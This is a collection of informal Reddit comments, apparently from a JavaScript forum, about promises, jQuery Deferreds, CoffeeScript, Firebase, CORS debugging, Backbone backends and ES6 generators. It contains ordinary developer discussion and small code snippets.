I don't really agree with all this - node was written to have many small moving parts. The first example you'd probably write a load balancer that could make sure that a particular process could handle more data and not send it along. As for the second, that' an implementation detail of streams. I haven't done much with streams or node for a while but I'm sure with good coding this problem doesn't come up, or at least you can check for data after something is full and decide what to do with it. That's a better option than losing async data.
Please take a look at ToffeeScript if you are looking to make async code easier to manage. That's with a T not a C.
I believe there are a few compile to JS languages that could be looked at including [TameJS](https://github.com/maxtaco/tamejs) and [Iced CoffeeScript](http://maxtaco.github.io/coffee-script/)... just go to http://altjs.org/ and search for "async"
are you creating your own attribute called "parallax"? Isn't that generally frowned upon? [Some discussion about that](http://stackoverflow.com/questions/1305734/is-it-ok-to-add-your-own-attributes-to-html-elements) Why not data-parallax="true" and data-parallaxanim="....." anyways, apart from that. Pretty cool plugin!
ah so that's why that happens on some sites. That always confused me.
Great in depth look at Firebase. Make sure to send this over to their support team.
Finally, I've had enough of CSS media queries
I've been thinking about that a bit. I am probably going to adopt it in the future. 
what are you talking about, CS? I just mean if that feature was included in JS itself, I might see myself moving off of CS entirely since that's a pretty useful feature in my line of work.
There is no other framework out there that can fix this problem. You're disconnected, you can't magically have your data given to the server. Granted, I would like to do this: Firebase.setInSyncCallback(function(isInSync) { if(!isInSync) somediv.innerHTML = "Your changes have not been saved to the server yet."; else somediv.innerHTML=""; });
There are certain applications where having the client appear to have sent the data to the server is very confusing. Firebase would not be a good choice for those applications currently. Until we can do Firebase.InstantClientCallbacks=false;
What browser versions have this now? The Intl class would be wonderful if it were in browsers from IE7 and up.
Isn't "parallax" the wrong word for this, or has the "30 great examples of awesome webthing" crowd basically hijacked the meaning of the word at this point?
At the risk of starting a flame war, I want to ask what is the point of bower? It seems like it is a clone of npm, only with no dependency management, central package hosting and the awkward requirement that you need npm to install it in the first place.
Bower is for the font end development. Anyway, you can use [npm on the clients side](http://dontkry.com/posts/code/using-npm-on-the-client-side.html), too
I was thinking the same thing earlier actually. It isn't really parallax. However, if you are creative enough, you can make parallax effects easy enough. What do you think would be a better name?
By "Promises" I'm assuming you mean Deferreds?
callback: asyncGetThingAsCallback("param", function(v) { alert("I got the thing"); }); promise: asyncGetThingAsPromise("param").then(function(v) { alert("I got the thing"); }); Where promises start showing their value over callbacks is when you have chaining. asyncGetThingAsCallback("param", function(v) { asyncGetOtherThingAsCallback("param", function(v2) { alert("I got both the things"); })}); asyncGetThingAsPromise("param") .then(function(v) { return asyncGetOtherThingAsPromise("param"); }) .then(function(v2) { alert("I got the thing"); }); 
How's this?: http://www.youtube.com/watch?v=juRtEEsHI9E
*Article:* **[You're missing the point of promises](http://domenic.me/2012/10/14/youre-missing-the-point-of-promises/)** An article written by one of the authors of the specification that puts it all into perspective. *Code:* **[Pinky](http://lazd.github.io/Pinky/)** A straightforward academic implementation of the Promises A+ spec that [includes examples](http://lazd.github.io/Pinky/build/examples/browser/fetchJSON.html) designed to explain the concepts behind using promises. *Edit:* See [Domenic's comment](http://www.reddit.com/r/javascript/comments/1ltmxq/is_there_any_good_article_or_tutorial_which/cc2z1w6) below for resources and videos.
I'm only just beginning to learn JavaScript, coming from a very OO C++ background. My impression is that you really need to put that thinking aside if you want to write idiomatic JS and take advantage of the unique features of the language. 
I'd call it scrolling-based animation but I don't name things good :)
I wrote one a whole back. http://chipersoft.com/p/I-Promise-You-Will-Learn-Something/
So my question now is, what is difference between $.ajax &amp; promises? Pardon me if I sound stupid. :)
There isn't any difference. $.ajax() returns a promise, so you can use that instead of setting the success/error callbacks. This: $.ajax({ url: '/some/url', success: function() { alert('do stuff'); } }); Becomes: var promise = $.ajax({ url: '/some/url' }); promise.then(function() { alert('do stuff'); }); This sounds snarky, but RTFM. http://api.jquery.com/jQuery.ajax/ You can scroll down and it will show you the promise methods available to you, and there is a link to the deferred object which is also helpful. 
Hah, yes. That *is* a Promise/A+ compliant implementation. The example confused me. I had a hard time seeing why an error on fetch didn't either fulfill the next promise or reject it. (I mean I couldn't see evidence of it.) Careful examination finally revealed that the first 'onReject' return undefined; hence the second promise went fulfilled. BUT, the second promise's onSuccess threw a "can't access 'content' of undefined" error, and the third promise (which got thrown away) ended up rejected.
No he means promises, which are different from deferreds. https://github.com/promises-aplus/promises-spec
this one should help understand the prerequisites [http://blog.peterdecroos.com/blog/2013/07/16/lexically-scope-like-a-boss/]
jQuery's Deferred object doesn't conform to the specification and misses a large part of the point of promises -- exception handling. See the following (linked above), which outlines some of the problems with jQuery's implementation: **[You're missing the point of promises](http://domenic.me/2012/10/14/youre-missing-the-point-of-promises/)**
Marek from Javascript Jabber?
There's a book called 'Async Javascript' which does a pretty good job.
You may type slightly less but at the cost of making the code more difficult to read, especially when working in teams. Whitespace is more difficult to read than brackets, and I don't see how you could argue otherwise. Please, if there is an argument to make that significant whtiespace is easier to read than C style syntax, then please make it. I would love to hear it. Claiming that using coffeescript is better because it is saving keystrokes is a misguided and lacks foresight. Working on other people's code is difficult enough without having to decipher the meaning of whitespace. C style syntax is far easier to read and follow because the delimiters are not invisible, they provide structure and make code easier to follow. 
XP is not "dying", it is only becoming unsupported by updates. Users will no doubt keep using XP for many years to come, and IE8 - the OS isn't just going to disappear overnight.
Make sure the backend makes the final validation of the world count. Frontend validation should be only for the convenience of the user.
You're right, the example was confusing. When sending a request to a non-existent server, the `onRejected` callbacks didn't function as the example implied they did. 1. The promise returned by `fetch()` was rejected inside of `fetch()`. 2. The `onRejected` callback added with the first call to `then()` didn't throw, therefore the promise returned by the first call to `then()` was fulfilled with `undefined`. 3. Because the promise returned by the first call to `then()` was fulfilled, the `onFulfilled` callback added with the second call to `then()` was called. 4. The `onFulfilled` callback added with the second call to `then()` threw an error, rejecting the promise returned by the second call to `then()`. **The bottom line:** The promise returned by the second call to `then()` was rejected because an error was thrown in the passed `onFulfilled` callback. This rejection was **unhandled**, so there was no way of knowing that an error occurred in the `onFulfilled` callback. As this example shows, it can be very confusing to understand what's going on when rejections are unhandled. One approach to solving this problem is to "cap off" promise chains with a call to `done()`, which popular promise libraries such as [Q](https://github.com/kriskowal/q) have implemented. A specification to deal with the "unhandled rejection" problem is under development, follow the discussion on the [Github issues page for the promises-aplus/unhandled-rejections-spec repository](https://github.com/promises-aplus/unhandled-rejections-spec/issues). In any case, the example has been updated to be much less confusing. You can check out the code being discussed [here](https://github.com/lazd/Pinky/blob/168c3ec62b02db6a38d268c2be252a70e99a998a/examples/browser/fetchJSON.html).
yes you [can](http://blog.rueedlinger.ch/2013/03/raspberry-pi-and-nodejs-basic-setup/)
Nope, you get an upvote on this. In the context of OP's question (and specifically the context of jQuery), the Deferred object controls the behavior of promises. The distinction is critical to understanding the jQuery implementation specifically as it applies to mutability and governance within the application flow. The specification in question has merit but calls for implicit exception handling. As jQuery has implemented a more complex system that does not implicitly bubble exceptions, a number of developers have outright discarded the original context of the question.
I found the solution by using: watchPosition and in the options enableHighAccuracy = true It will use the gps sensor in the device and do a call to the method every time the position changes
Ah! So simple. Thanks for the update. This helps me as well. 
&gt; You've taken a runtime language and turned it into a compiled language. The CS compiler has a `watch` option for automatic recompilation. It makes me forget about the compilation step most of the time. It's subjective, but for me at least, the additional element in the toolchain is absolutetly worth it.
We get twice nearly twice the teaching hours, a better student/teacher ratio, a different curriculum and better hiring outcomes. It's a pretty massively different product. I'm not saying this to knock dev bootcamp or app academy (whose instruction I've seen and can verify is top notch). Hack Reactor is the longer, more intense, higher investment, higher return option.
Your event handler looks a bit off -- usually people just use jquery or something to not worry about the intricacies between cross browser wonders &amp; older IE versions -- but in most modern browsers, the function you pass to the second parameter of addEventListener needs to be the name of a function, or an anonymous function. This is the event handler -- it will have a single parameter passed to it, the event object, which has a bunch of properties based on the kind of event -- in this case, you can use the target to get at the element that raised the event. see [MDN for reference](https://developer.mozilla.org/en-US/docs/Web/Reference/Events/blur)... for something like a click or dragging event you can see x/y coordinates, keypress tells you what key, etc... Anyway, This is untested, but should work : var el = document.getElementById("ninja_forms_field_18"), blur_event = function(e){ count_words(e.target.id, 100); }; el.addEventListener("blur", blur_event, false); 
I really like CoffeeScript. I love the use of indentation, the ability to go paren free. -&gt; for function and =&gt; for a function that binds this. Some of the features like comprehensions, ranges, the behaviour of the 'in' operator, and object iteration are also really nice. However, I've also been wondering the past few days if it's a complete dead-end. CoffeeScript doesn't support 100% of ES5, supports 0% of ES6.. and since it targets the lowest common denominator of JS engines... well, I'm not sure about it anymore. I want to use things like accessors in my code, I want to use generators, I'm going to want ES6 classes and modules and other features that are used via new keywords and syntax. EDIT: I also wonder if JS + Macros such as sweet.js is the better way to go.
I think you misunderstood the article the GP linked. They didn't contribute to a supercomputer project. They *built* one and ran it across a gigantic cluster of multi-processor servers and got better performance out of it than competing hadoop solutions. Your assumption that people who learn client-server programming in JavaScript are incapable of learning other languages is ridiculous. FYI, I'm an HR grad who designed a DSL, implemented an interpreter for it and embedded it into an HTML 5 game prototype during the course.
I was in the second cohort. I came out with zero social proof since the school was so new, but my hard skills had improved so much I literally had 3 big software companies and half a dozen start-ups competing for me by the time I finished. It was *freaking* expensive, but the best investment I've made in years. Not only that, but I've been able to jump into Coursera CS classes meant for grad students since finishing at Hack Reactor. As for students not getting included in stats, to the best of my knowledge people who quit have all quit before the halfway mark of the class. I believe my class lost 2 students of 14 and that was the worst of any HR class ever. One of those two just left, and the other had some medical issues, left and then came back to join the class behind me. The only distortion I see is that there are so many applicants that the school can be absurdly selective. With an acceptance rate lower than that of any 4-year university, Hack Reactor has an exceptionally ambitious, hard-working and intelligent student body, especially in recent cohorts. That's probably not scalable.
Funny you should ask... A friend of mine is fairly near publication on a book with O'Reilly which is entirely about using "deferred" and "promise" in jQuery. I'll point out this thread for him.
Agreed
Thanks for getting back to me. I have run my experiment several times over the last week. The behavior recurs. I have provided my code and approach so people can test for themselves. The one thing that should be considered is that I am in Dublin, Ireland and there may be some network latency if your servers are located in USA. It should be possible to create a safety net using localStorage so that unsynced data can be saved and put back into play after a page refresh. So I think this problem may be fixable. I think in traditional REST that he developer has much more control as to when to GET/POST data and understands it alot better. I think the firebase .once() sync pattern works more like traditional REST. I agree with your point that data can be lost in traditional REST on a refresh but only if you are not using a local storage solution.
THANK YOU!
Yea, OP it is important to note that `myFunction()` resolves to the return value of the function, where `myFunction` would allow you to pass the function itself. If you have parameters its easiest to wrap your function call in another function as tswaters demonstrated. Since your function has no return value, your first line essentially says: .addEventListener("blur", undefined, false); As a minor aside, you should be careful with parseInt(). Typically I have that abstracted into a function which always calls it with the optional second parameter set to ten. If you don't pass in 10 as the second parameter you can end up with some headaches when you assume it evaluated your number as base ten but it really considered it base 8. 
jQuery's $.Deferred has not changed at all since this post was originally written. jQuery is still broken in exactly the same ways described in this post.
A coworker and I set out on the endeavor of writing almost this exact plugin so imagine my surprise when this pops up with commits no more than 3 weeks ago. I'm glad this was finally done though! I've always lamented the fact that github never extracted this out for other people to use. Good work.
This is perfect. We're using [Backbone.Advice](https://github.com/rhysbrettbowen/Backbone.Advice) and it decorates functions. My coworkers often complain about having to step through it to get to the next part of the decorated function. This is going to make people happy.
See if this helps: http://www.youtube.com/watch?v=PMfcsYzj-9M
shows building an implementation using the spec http://modernjavascript.blogspot.com/2013/08/promisesa-understanding-by-doing.html
It's used to create the entire front end, so anyone or any modernish device in the house can control the lights or playing audio etc. Dojo is used for all of it, it's an awesome toolkit which uses AMD and allows for a smooth/rapid development. http://dojotoolkit.org/ There is some node, however right now it's only for recording temperature on regular intervals using CouchDB. It will be used for running macros when certain conditions have happened wether its time, date or temperature etc.
CoffeScript has helped bring the Ruby cool kids to JavaScript. TypeScript is showing us what javascript could be, and hopefully will be soon. (If you've used ActionScript 3, you're already familiar with most of it. ES4 lives.) Too bad there isn't an easy way to emulate generators on older JS engines, since that's one of the more disruptive new chunks in ES6, yet typescript won't have a good way to implement that without underlying JS support. 
This is really cool. When I'm stepping through the code in the debugger it will often jump into the jQuery source, at which point I'm like "fuck this" and break out the console.logs around the suspected code instead.
Yeah, this is a great feature. Also, as @passy [pointed out on Twitter](https://twitter.com/passy/status/375955999850373120): &gt; And all of a sudden "Pause on uncaught exceptions" is my favorite thing again.
It is indeed still the case. The A+ spec just makes minor clarifications to the A spec.
I finally put together [a page of resources for general promise concepts]( https://github.com/kriskowal/q/wiki/General-Promise-Resources) on the Q wiki. It includes presentations/videos, blog posts, and podcasts. In particular, I think the most beginner-friendly is probably mine and Michael Jackson's presentation ["Redemption from Callback Hell"](https://speakerdeck.com/mjijackson/redemption-from-callback-hell) which comes with a great [video](http://www.youtube.com/watch?v=hf1T_AONQJU).
ES6 transpilers. Write valid javascript, transpile to ES5. You are writing code that will work in any modern javascript engine, but you are shipping code that will work in any javascript engine.
"This rejection was **unhandled**" That's the thing about Promises, though. That third promise *could* have been kept around, until the end of the scope, and never addressed. **Or** it could have been kept, and at some point an onRejected handler could have been added to it. When is an *unhandled* exception really *unhandled*, and when is it just *deferred*?
I'm finding a new love for "Event Listener Breakpoints" now it skips past all the jQuery event handling to the function I actually want
You can still implement server-side ES6 features as soon as they are available in Node.
Maybe you can use jquery :focus selector on ctrl+c event handler? Can't check if it works or not right now..
There is probably a better way, but just going off the code samples on their page I got this - http://jsfiddle.net/pXCTV/1/ Is that what you were looking for?
It may be better knowing what you are trying to accomplish, as opposed to what you want this particular plugin to do. There may be a more efficient way to achieve the intended behavior.
Awesome post, thanks. I'm trying hard to keep up with all the new ES6 language features. Do you know if iterables are going to support higher-order methods in some way? Something like... const lazySequence = (for (x of a) for (y of b) x * y); // Get first 10 multiples of 5 from lazySequence for (let z of lazySequence.filter(n =&gt; n % 5 === 0).first(10)) { console.log(z); } ? Or maybe a list comprehension style of doing this rather than method calls?
I want the user to be directed to a website after they choose to copy some text. If there was only 1 instance on the web page where they would ever do this, the plugin would suit me fine. I want to keep things DRY more than anything else. 
Since iterables are duck typed (i.e. anything with a `next` method), this is not really possible. Generators are not going to have any methods like that, but you can use generator expressions for similar effect, e.g. instead of `lazySequence.filter(n =&gt; n % 5 === 0)` you can do `(for (n of lazySequence) where (n % 5 === 0) n)`.
The waveform composer you are showing is pretty cool. Is that stripped out as a utility somewhere?
OK, so that answers part of it, I can do: const lazySequence = (for (x of a) for (y of b) x * y); const lazyMultiplesOfFive = (for (n of lazySequence) where (n % 5 === 0) n); Is there now a way to say "Now concretely give me the first 10 of these"? var result = lazyMultiplesOfFive.slice(10) ? I guess I'm just hoping I don't have to do a manual loop with a counter here.
Exactly. As I mentioned, `done()` is one way of "capping off" promises such that, if the promise is rejected with no `onRejected` handler, then the error will be thrown, stopping program execution. You're totally correct; this is definitely an issue with promises. There are other ways of handling this being discussed in the unhandled-rejections-spec repository.
Should I feel a bit bad about having written the exact same thing for a project 3 years ago, including fuzzy search functionality, and never shared it with anyone because I hadn't heard of Github..? :S
Nope. The original underlying code is written by Steven Wittens and can be found here http://acko.net/files/audiosynth/index.html
A couple problems with this: A)You are only taking into account people that explicitly use keyboard shortcuts. Many people, choose to use right-click copy/paste, so likely you would have to replace the default context menu with your own that you can explicitly register events on. B) People don't like forced navigation, unless it's expected (and core to your site ). Based on the minimal information, you may want to go with buttons so you can easily bind a click event, and the users will explicitly control the flow of the site.
Are you by chance trying this in IE? If so, remove that trailing comma after the closing brace for the data... IE has historically choked silently with trailing commas so you'd see no error but the script won't execute. I'm not sure if later versions handle this, and other browsers have never had a problem with it.
where is the response should go?
I am using Firefox. Thanks!
please explain.. I don't understand your english or the sentence as a whole..
I'm only seeing a request header. No response header. No error. I have pasted the header below. I appreciate your help. http://s9.postimg.org/zc5dkaerj/Capture.png
You should give [jQuery Validation](http://jqueryvalidation.org/) a whirl, I started using it recently and it really makes things much easier 
Not really, although you can create a reusable function that will do that pretty easily: function* first(iterable, n) { let i = 0; for (let x of iterable) { yield x; if (++i === n) { break; } } } const result = first(lazyMultiplesOfFive, 10); I think there will be a lot of utility libraries operating on iterables popping up in the ES6 timeframe; hopefully some basic utilities of that kind will be standardized in ES7, much like Python's itertools.
If you don't want to use an existing library I usually write one validator function that can take a set of rules that returns some errors. A super simple example (that I didn't actually run): var validateForm = function(validator) { var errors = []; for(var i = 0; i &lt; validator.length) { var val = $(validator[i].selector).val(), v = validator[i]; if(v.required &amp;&amp; !val.length) { errors.push(v.name + ' is required'); } } }; ver errors = validateForm([ { selector: '#fullName', name: 'Full name', required: true }, { selector: '#emailAddress', name: 'Email', required: true, }, { selector: '#message', name: 'Message', required: false } ]); You can add your own rules and conditions etc, but this way it's not limited to just one form, which should keep things cleaner. You can add checks for required types (int/float/alphanumeric etc), regular expression matching and so on. It can also be handy to store the rules in the actual input element as attributes, that way you can just pull those in the form submit function and use them for the rules.
Sounds like you can't reach your endpoint. Figure out what's wrong between your browser and the server. In fact, get rid of the browser and get this working in curl. I'd guess that the server isn't really listening on 31456 and you're timing out.
What type of backend techology are you using? If php/apace check the main apache config file. Apache usually determines the port used. If you're using node js, do a recursive grep through your files with that IP addr. And if not found then thats not the port you're using, because you manually set the port in nodejs. Edit: also if you have the ability to change ports try it on port 80 so you dont have ti type a port in. If it works on port 80 then you have a bigger port problem then a wino
I like this library: http://casperin.github.io/nod/
It is in Blink; so most users of Chrome, and the two most recent versions of Opera, and is in IE11. It is also in a special nightly build of Firefox, so hopefully it will be coming there soon. So, in short, it is not usable yet, but it is coming. The Firefox users will be auto-updated, as will IE9–10 once 11 is released. IE7 and 8 users are stuck. It should be possible to polyfill (there currently is one, but doesn't support Intl.collator), and you could use toLocaleString() et al, just that it will select the locale of the browser, rather than allowing you to select it yourself.
at least the kool-aid is good
Are you sure you can even connect to 10.0.0.81:31455?
Might be easier to do what you want with this instead of keypress. https://github.com/jeresig/jquery.hotkeys
this is pretty sweet, great job. is it currently possible to record notes as you play them?
We do use it, but it's not 100% so you end up having to check if it's running often - because the one time you don't it'll have failed and you'll be freaking out wondering wtf is going on lol. I understand the appeal of CS, but I just don't care for it.
Thanks for the tip! I've never heard of cURL but found the wiki. Looks promising, can't wait to try it out. One of my main problems w/ this was the difficulty and usability of browser dev tools. 
We are currently using ColdFusion 8 for our backend. I was considering writing the AJAX/JSON function/events in CF, but already had the $.ajax() written up so I thought I would run with it. Unfortunately I am required by the Shoretel SDK to use this port only. Thanks for your help!
This is amazing! Thanks for the heads up :).
Thank you. I have disabled this feature until I add quantization and some means to edit group of notes.
I think you completely misunderstood the awesome response that was given to you. Nested callbacks are not promises. Promises are made to avoid nested callbacks! Also, $.getJSON and $.ajax you mentioned return promises, so you can both pass a callback and work with the ugliness, or work with them as jQuery promise objects and make the code much more managable that way.
definitely, and setting DOM subtree modification breakpoints too. this is one of those, find out about it and then immediately use it forever and ever kind of things. 
But still, get rid of the trailing comma. /twitch
You're welcome. I got the sense you are just trying to walk before you can crawl. Also look at wireshark. Understanding exactly what is being sent from your browser to the server is going to help you through your entire career. I've gotten to the point that when I join a new company (I'm in management) I make wireshark mandatory for all developers. Its super effective. As I just told another dude, any problem you don't understand is simply one you haven't broken down into small enough pieces yet. Understand the OSI layers and how the software you're writing works with them.
Sounds like a cross-domain request, which browsers normally block (notice the request has an Origin header, which I think is only sent on cross-origin requests). The modern solution is to use CORS, or a library that helps get around those limitations. Also, I think Chrome is more helpful than Firefox in letting you know that the response was blocked. EDIT: To be clear, the browser will send a cross-origin request, but may block the response without the correct headers in the response. I think older browsers may block the request from being sent, but there are workarounds, e.g. the easyXDM library, and if you don't need really old browser support, JSChannel.
been looking for this for a while now. any idea what the delimiter is for specifying multiple patterns in chrome? i.e. jquery,underscore,easeljs 
Sounds like an XHR problem. The request is coming from the same IP, but a different port. Your server doesn't do CORS, so no answer. Check the JS console for an error.
I really feel like Domenic has utterly missed the ball. Thennables are a concurrency construct, true, and he focuses on that use-case, that nature of the situation. But thennables are an implementation detail, a use-case, for a value type. A promise is a value, a primitive value, alike a string or integer. It's a value for a thing which is at some point going to become a thing. So, it's like a pointer value, only it's a write-once read many (WORM) pointer value. The whole mechanistics about how we interface with the WORM pointer value is all implementation detail obfuscating the underlying point, which is that a promise is a primitive value to pass around that represents something that is going to come to be. Put the horse before the cart, the horse is what it is, the cart is how we use it.
ah, makes sense. looking forward to it!
Just going off of what you have posted, and looking at the code, I have to wonder if your server is expecting the data as a url string via GET. It appears that you are trying to do authentication, which unless your server is setup to do auth and response over GET, may be why you are having issues. What you have there would equate to: http://10.0.0.81:31456/?Request=Authenticate&amp;Type=RTA&amp;User+Name=shoretelrta&amp;Password=shoretelrta If you copy that into your browser and navigate to it and you see your expected JSON response, then you have a code problem. What is more likely, though is that your server is looking to do the auth and request through POST. Again, I don't know too much about your set-up, but it might help point you in the right direction.
The following test cases yield incorrect results: random_uniques(1000, 1000, 1); random_uniques(1000, 1000, -1); random_uniques(1000, 1001, 1); random_uniques(1000, 1002, 1); EDIT: ...assuming that `min` and `max` are to be inclusive. If they're exclusive, then only the 2nd and 4th calls return incorrect results.
Why would you steer away from using a jQuery plugin?
If you read the article it explains why.
You mean.. the part about not being able to upload files? If there's a way to add jQuery code, then there's a way to add a jQuery plugin. Copy and paste the jQuery plugin where you'd normally place the jQuery code. Then, under the plugin code you can enter the code needed to activate/run the plugin.
Source maps are already here!
That is most certainly *not* how you generate unique random numbers. (That linear scan on each iteration is ghastly.) Your method takes an unbounded amount of time, possibly infinite. The proper way to do this is to fill an array with each candidate number and then shuffle it using [Fisher-Yates](https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle). If you need less than the full sequence, you can stop the shuffle early to avoid doing unnecessary work.
this is the correct answer.
Maybe try adding: xhrFields: { withCredentials: true } reference: http://api.jquery.com/jQuery.ajax/
List comprehensions are very nice once you get used to them. They're more readable than for loops for simple things. Default parameters are also handy. Coffeescript fixes a lot of little things. However I'm not sold on how they do significant white space... Python was carefully designed so that indentation mistakes almost always throw an error. Coffeescript tends to quietly generate different code. It seems like that'll bit you in the ass.
Couldn't find one without a jQuery dependency, thought I'd share. Hope someone finds it useful.
Awesome idea. I'll knock it out when I get a chance, here's an issue if you're interested in keeping an eye on it: https://github.com/mazondo/gravatarjs/issues/1
Good stuff. This is how libraries should be built. Any one of the existing gravatar libraries should be extending a small project like this to avoid duplicating effort. A note about `.gitignore`: `.DS_Store` is platform specific, not project specific. As such, you should add it to your workstation's global ignore file, not your project's. See [Ignoring files/Global .gitignore](https://help.github.com/articles/ignoring-files#global-gitignore) on GitHub help.
oh man thank you so much for the .gitignore tip. I always forget that part and end up having to remove them several commits into a new repo.
I use C# for my backend server, but I don't think that's common. I'm just comfortable in C# and it didn't take too much effort to integrate with Backbone. NodeJS is definitely the cool kid on the block right now, but I dunno, I like having a compiler.
I love this! &lt;3
Pyramid, which is Python
Backbone is a standalone front end library, so there's no specific back end language or framework that works better than any other in conjunction with it. There's an argument to be made for node, but that has more to do with code reuse than interoperability.
Just aside, why would people use jQuery to generate an MD5 of an email address? jQuery doesn't even do MD5 does it? They'd still need a separate MD5 implementation. 
Love this indeed, thanks so much! I'll take a look in the morning and merge it in.
I'm not sure exactly, as it has nothing to do with the dom. The only thing I can figure is that .trim() isn't available below IE8, so maybe they were hoping to take advantage of the $.trim() functionality.
Maybe, but they'd have to have a phobia of regular expressions. Trim in Javascript is .replace(/^\s+|\s+$/g, '')
Truth is that things are really simple, just learn how `done` and `then` work and when to use them. `done` should be first choice function. It's one you use to simply access or process resolved value, and `then` is more sophisticated one, which you should use if you want to map resolved value into another promise that is needed for your flow `then` hijacks any errors and propagates them further to returned promise, `done` naturally exposes them. There are no issues with error handling once you understand how both functions works. 
Express/node is a good one. The benefit being you're using javascript on both sides...and can use a lot of the same libraries in each (moment.js for example). You'll need a database like Mongo and probably nginx.
In redradix.com we use node.js and rails, mostly
awesome!
Thanks for this - v useful
That's not entirely true... frameworks that support/default to REST conventions work better with Backbone. For example, RoR scaffolding REST pretty much matches up exactly with what Backbone expects. Some frameworks are anti-REST (i.e. early JSF - *everything* was POST). Most can provide REST, but assume that the person writing the API knows REST concepts, which makes it easier to run into issues where you have to figure out why something isn't *just working* because you messed up the naming or used the wrong HTTP method. Or you're stuck with a not-really-REST service and have to customize Backbone's sync/parse/toJSON methods extensively.
crazy :)
&gt;Do I separate it into 2 repos (one for backend &amp; landing page, one for js app) Yes. This is generally the way to do it. The API really has nothing to do with the frontend - and if developed "properly", the entire frontend can be delivered via a CDN - no python needed.
What the hell is going on here ? Are you a wizard ? Edit: After staring at the source for a while with a stupid look on my face I get it, but i am curious how anyone came to have this idea ?
Cool, thanks. Any tips from a development perspective? I've heard stories about CORS being a pain but I can't say I know a ton about that... Am I worrying too much and should just go write some damn code and see where I end up? haha
&gt;Any tips from a development perspective? I've heard stories about CORS being a pain but I can't say I know a ton about that CORS is a pain, but it's not really that big of a deal - you should only be *pulling data* from the API, not executing code from the API. &gt;Am I worrying too much and should just go write some damn code and see where I end up? Yes, this.
Just split up the front-end and backend deployment. Your version control and deployment are two separate things. In nginx or similar just have one copy of your repo in the web-root for serving, and another somewhere else for the backend code. If you just need to update one, do that, and then next time you update the other it'll 'catch up' anyway.
Django + Django Rest Framework is perfect.
Express or Connect on Node.js: works great and gives you fullstack JavaScript instead of multiple languages.
I tried pressing the button twice to stop it andaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
correct me if im wrong, but isnt this for cross domain?
Yea, there is a full corporate network between me and the hardware XD I have the ability to log on to the server and attempt this. Can AJAX requests be run locally? Thanks for your input!
This is awesome. Made it to `Uncaught TypeError: Object #&lt;Console&gt; has no method 'clear' ` ...level cleared?
Works with browsers that support console.clear method. Try it with Chrome. EDIT: Tested with Firefox 23 + firebug also and it works. Just have to scroll to the bottom of the console at the beginning
&gt; Your version control and deployment are two separate things. good point. With things like Heroku I keep getting caught thinking of it as one and the same since it's just so easy to deploy with git.
Oh, might be that old versions of Chrome doesnt support .clear() method. I'm using version 29.0.1547.65
I'm using backbone for the front-end, so I guess MV* or whatever you want to call it. MVC on the server isn't right for me because I really just want an API that is totally client agnostic. By separating my code, I really mean in terms of workflow, deployment and version control.
There are no errors in the console. Can you please elaborate on your answer? I am not very familiar w/ JS or writing AJAX calls. This project was thrown into my lap :/ I will read up on CORS and XHR to get a better understanding of the two. If there is anything else that would help me understand please share some search terms :) thanks!
its not cross domain. I apologize for not being clear. I am on the same domain. I will google CORS. I no nothing about this but it sounds like you may be on to something. Thanks.
Nice idea ! (Also, I got an impossible line : [18:29:13,509] "##################################--O--################################################################" "993 points" [18:29:13,530] "###################################-O-#################################################################" "994 points" [18:29:13,564] "####################################O##################################################################" "995 points" [18:29:13,914] "You crashed with 996 points!" ) EDIT : Or maybe I hit a direction while passing through the last line ?
Hmm.. got to 583 points so far. Looks like it'll cycle out of party hard mode but with faster descent.
It's most likely a cross origin issue. Different ports mean different origins. Look up CORS headers. 
I used Rails for http://burndown.io because: 1. [Omniauth](http://www.omniauth.org/) really simplifies authentication (especially with Github) 2. [Session management](http://guides.rubyonrails.org/action_controller_overview.html#session) is easy with Rails 3. Rails is very easy to deploy on Heroku (especially for small/low traffic applications like Burndown)
So how does this compare to Skrollr?
great tips. Thanks! I thought wireshark was strictly wireless. Is this going to be equivalent to fiddler? What one is best to download? I was also told to try cURL. Thanks!
Out of curiousity, what are you building the API with? We had great success with the [Django REST Framework](http://django-rest-framework.org/).
We're building it out on top of flask without any sort of plugins for REST, for better or worse. 
It was bound to happen at some point. I was just waiting for someone to make a javascript console demo/intro. Glad it finally happened.
Good luck with that. I've had nothing but headaches working with Flask. KVSession has some fundamentally bad bugs in there...
Bad luck, mate ;D
I love it.
I agree with your point, but I think it's a pretty minor caveat. If you're going to interact with an API, you need to spend a bit of time digesting it. And in my experience, custom parsers are necessary in almost every application, since Backbone makes no assumptions about the structure of the return (IE {'status': 'ok', results: [...]} or {'records': []} or whatever). I've never been able to just throw URL into a Collection and call it a day.
I agree with everyone here about keeping them separate, that's become my favorite way to develop. Regarding the CORS issue, I've developed a tool for myself to get around this. It's a passthrough server written in node. You tell it what directory your front end is in, as well as the host/port for the backend (usually localhost:9393 for me as I'm a sinatra guy). Any request that references a file in your front end code will be given the file, anything it doesn't find gets passed to the api server. The console outputs the request/response data so you can troubleshoot it. You can check it out here if you think it'll help: https://github.com/mazondo/passthrough edit: spelling
my console doesn't follow the new lines... :/ is there a setting I don't know about?
Haha. Reminds me of some of my debugging sessions. :-\
Yes, you can call AJAX locally. I have a folder off of my project root called 'json/' to allow for exactly this kind of dev. So when I do an AJAX call the URL looks something like this 'json/test1.json'. Good luck! Wish I'd thought to ask Reddit back then. :-\ 
nice and addicting lol. [19:44:57.247] "You crashed with 1439 points!" [19:44:57.247] How long it took for you to crash: 71714ms
I guess you are right, I still might have confusion about the promises. I guess I will have to read the articles and comments once again. 
Yeah, I've liked it a lot for smaller projects... haven't run into KVSession as we're really pretty early in development. Thanks for the heads up though. 
I'll just add - load test sooner rather than later. Before you're "done", preferably. There are some weird behaviors in there.
Thanks, I'll definitely take a look at that once I restructure! 
More Chromium centric software.
Annyong!
TI-85 FOREVER
I'm trying to get CORS working between Flask and AngularJS at the moment. GET requests work but POST requests fail saying the domain isn't in the allowed origins. I like Flask all around though and it adapts to whatever I need it to so far.
Spent about 60 seconds feeling stupid and trolled until I realized I had to click the 'allow microphone' button in Chrome... But yeah, after some speedbumps, we got there. Pretty slick!
Fun side project in just plain JavaScript. Interested to hear what people think! Probably going to fork it and try a webrtc version for fun too.
Neat, I'm working on my first Firebase project right now. I would have never thought to convert the image to a string and stick it right in the html, you're a weirdo.
Cool! I see the appeal. Haven't looked at the code yet - how/ where are you hosting user uploaded images?
Thank you kindly :) Much appreciated.
Thanks :) Glad to hear you liked it. I'll try to put in some extra hours then :)
It works well with my Dutch English accent. Quite like it, might make some irrelevant codepen demo's with this.
Hello.
